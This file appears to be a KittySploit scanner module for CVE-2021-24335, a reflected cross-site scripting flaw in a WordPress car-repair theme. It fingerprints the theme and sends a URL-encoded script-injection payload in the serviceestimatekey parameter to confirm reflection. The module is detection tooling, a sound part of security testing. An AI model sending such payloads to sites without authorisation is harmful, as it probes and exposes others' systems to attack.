#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Car Repair Services & Auto Mechanic before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Car Repair Services & Auto Mechanic Theme <4.0 - Cross-Site Scripting Detection',
        'description': 'WordPress Car Repair Services & Auto Mechanic before 4.0 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the serviceestimatekey parameter before outputting it back in the page.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'wordpress', 'xss', 'wp-plugin', 'wpscan', 'smartdatasoft', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://themeforest.net/item/car-repair-services-auto-mechanic-wordpress-theme/19823557',
            'https://m0ze.ru/vulnerability/[2021-02-12]-[WordPress]-[CWE-79]-Car-Repair-Services-WordPress-Theme-v3.9.txt',
            'https://wpscan.com/vulnerability/39258aba-2449-4214-a490-b8e46945117d',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24335',
            'https://m0ze.ru/vulnerability/%5B2021-02-12%5D-%5BWordPress%5D-%5BCWE-79%5D-Car-Repair-Services-WordPress-Theme-v3.9.txt',
        ],
        'cve': 'CVE-2021-24335',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/themes/car-repair-services/css', '/wp-content/themes/car-repair-services/js', 'id="car-repair-services-',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/car1/estimateresult/result?s=&serviceestimatekey=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Car Repair Services & Auto Mechanic Theme <4.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

